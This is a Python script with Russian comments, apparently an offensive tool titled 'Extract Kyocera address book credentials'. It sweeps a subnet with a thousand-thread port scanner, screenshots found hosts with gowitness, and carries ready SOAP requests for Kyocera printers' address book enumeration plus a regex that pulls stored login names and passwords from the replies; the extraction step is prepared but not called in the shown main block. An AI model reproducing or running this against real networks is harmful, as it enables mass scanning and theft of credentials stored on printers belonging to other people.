import argparse  # Для работы с аргументами командной строки
import socket  # Для работы с сетевыми операциями
import re  # Для работы с регулярными выражениями
import os  # Для взаимодействия с операционной системой
import sys  # Для доступа к системным параметрам и функциям
import ipaddress
from concurrent.futures import ThreadPoolExecutor, as_completed
import subprocess

from scapy.all import ARP, Ether, srp, conf  # Для работы с сетевыми пакетами
import requests  # Для работы с HTTP-запросами
from lxml import etree  # Для работы с XML

from tabulate import tabulate  # Для вывода в таблицы
from colorama import Fore, Style  # Для цветов в консоли


class Kyocera:
    def __init__(self):
        """
        Задаем начальные параметры
        """
        self.interface = None
        self.subnet = None
        self.alive_ips = None
        self.valid_ips = []

        self.address_book_url = '/ws/km-wsdl/setting/address_book'
        self.headers = {
            "user-agent":
                "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; "
                "..NET CLR 1.1.4322; InfoPath.1; "
                ".NET CLR 2.0.50727)",
            "accept": "en-us",
            "content-type": "application/soap+xml"
        }
        self.regex_pattern = (r'<kmaddrbook:login_name>[^\<]*</kmaddrbook:login_name>'
                              r'<kmaddrbook:login_password>[^\<]*</kmaddrbook:login_password>')
        self.enumeration_request = ''
        self.body_create = f'''
            <?xml version="1.0" encoding="utf-8"?>
            <SOAP-ENV:Envelope
                xmlns:SOAP-ENV="http://www.w3.org/2003/05/soap-envelope"
                xmlns:SOAP-ENC="http://www.w3.org/2003/05/soap-encoding"
                xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
                xmlns:xsd="http://www.w3.org/2001/XMLSchema"
                xmlns:wsa="http://schemas.xmlsoap.org/ws/2004/08/addressing"
                xmlns:xop="http://www.w3.org/2004/08/xop/include"
                xmlns:ns1="http://www.kyoceramita.com/ws/km-wsdl/setting/address_book">
                <SOAP-ENV:Header>
                    <wsa:Action SOAP-ENV:mustUnderstand="true">
                        http://www.kyoceramita.com/ws/km-wsdl/setting/address_book/create_personal_address_enumeration
                    </wsa:Action>
                </SOAP-ENV:Header>
                <SOAP-ENV:Body>
                    <ns1:create_personal_address_enumerationRequest>
                        <ns1:number>25</ns1:number>
                    </ns1:create_personal_address_enumerationRequest>
                </SOAP-ENV:Body>
            </SOAP-ENV:Envelope>
        '''
        self.body_get = f'''
            <?xml version="1.0" encoding="utf-8"?>
            <SOAP-ENV:Envelope
                xmlns:SOAP-ENV="http://www.w3.org/2003/05/soap-envelope"
                xmlns:SOAP-ENC="http://www.w3.org/2003/05/soap-encoding"
                xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
                xmlns:xsd="http://www.w3.org/2001/XMLSchema"
                xmlns:wsa="http://schemas.xmlsoap.org/ws/2004/08/addressing"
                xmlns:xop="http://www.w3.org/2004/08/xop/include"
                xmlns:ns1="http://www.kyoceramita.com/ws/km-wsdl/setting/address_book">
                <SOAP-ENV:Header>
                    <wsa:Action SOAP-ENV:mustUnderstand="true">
                        http://www.kyoceramita.com/ws/km-wsdl/setting/address_book/get_personal_address_list
                    </wsa:Action>
                </SOAP-ENV:Header>
                <SOAP-ENV:Body>
                    <ns1:get_personal_address_listRequest>
                        <ns1:enumeration>{self.enumeration_request}</ns1:enumeration>
                    </ns1:get_personal_address_listRequest>
                </SOAP-ENV:Body>
            </SOAP-ENV:Envelope>
        '''

    @staticmethod
    def check_root_permissions():
        """
        Checks if the current user is root or not.
        """
        if os.geteuid() != 0:
            os.execvp('sudo', ['sudo', 'python3'] + sys.argv)

    def argument_parser(self):
        """
        Парсер аргументов командной строки
        """
        parser = argparse.ArgumentParser(
            prog='Extract Kyocera address book credentials')
        parser.add_argument('-i', '--interface', required=True, help='Сетевой интерфейс')
        parser.add_argument('-s', '--subnet', required=True, help='Подсеть или одиночный IP для сканирования')
        args = parser.parse_args()
        self.interface = args.interface
        self.subnet = args.subnet

        # Вывод исходных данных в виде таблицы
        table_data = [
            [f"{Fore.YELLOW}Интерфейс{Style.RESET_ALL}", self.interface],
            [f"{Fore.YELLOW}Подсеть{Style.RESET_ALL}", self.subnet]
        ]

        # Вывод таблицы
        print(tabulate(table_data,
                       headers=[f"{Fore.MAGENTA}Параметр{Style.RESET_ALL}", f"{Fore.MAGENTA}Значение{Style.RESET_ALL}"],
                       tablefmt="fancy_grid"))

    def scan_network(self):
        """
        Сканирует диапазон IP на наличие открытого порта.
        """
        ip_network = ipaddress.ip_network(self.subnet)
        ip_range = [str(ip) for ip in ip_network.hosts()]

        total_ips = len(ip_range)

        # Разбиваем IP-адреса на батчи по max_workers
        for i in range(0, total_ips, 1000):
            batch = ip_range[i:i + 1000]
            with ThreadPoolExecutor(max_workers=1000) as executor:
                futures = {executor.submit(self.is_port_open, ip): ip for ip in batch}
                for future in as_completed(futures):
                    ip, port, is_open = future.result()
                    if is_open:
                        self.valid_ips.append(ip)

    @staticmethod
    def is_port_open(ip, timeout=1):
        """
        Проверяет, открыт ли один из портов 80, 443, 8000, 8080 на заданном IP-адресе.
        """
        ports = [80, 443, 8000, 8080]
        for port in ports:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                sock.settimeout(timeout)
                result = sock.connect_ex((ip, port))
                if result == 0:
                    return ip, port, True
        return ip, None, False

    @staticmethod
    def run_gowitness_scan(valid_ips):
        """
        Запуск команды 'gowitness scan --cidr <ip>' для каждого IP-адреса в списке valid_ips
        с использованием потоков и разбивкой задач на батчи по 1000.
        """
        total_ips = len(valid_ips)

        # Разбиваем IP-адреса на батчи по max_workers
        for i in range(0, total_ips, 50):
            batch = valid_ips[i:i + 50]
            with ThreadPoolExecutor(max_workers=50) as executor:
                futures = {executor.submit(subprocess.run, ['/home/suzu/go/bin/gowitness', 'scan', '--cidr', ip], capture_output=True): ip for ip in batch}
                for future in as_completed(futures):
                    ip = futures[future]
                    try:
                        result = future.result()
                        if result.returncode == 0:
                            print(f"gowitness scan для {ip} успешно выполнен.")
                        else:
                            print(f"gowitness scan для {ip} завершился с ошибкой: {result.stderr.decode()}")
                    except Exception as e:
                        print(f"Ошибка при выполнении gowitness scan для {ip}: {e}")


if __name__ == '__main__':
    suzu_kyocera = Kyocera()

    # Проверка прав пользователя
    # suzu_kyocera.check_root_permissions()

    # Чтение аргументов командной строки
    suzu_kyocera.argument_parser()

    # Сканирование сети на наличие открытых портов Kyocera
    suzu_kyocera.scan_network()

    print(suzu_kyocera.valid_ips)
    print(len(suzu_kyocera.valid_ips))

    suzu_kyocera.run_gowitness_scan(suzu_kyocera.valid_ips)





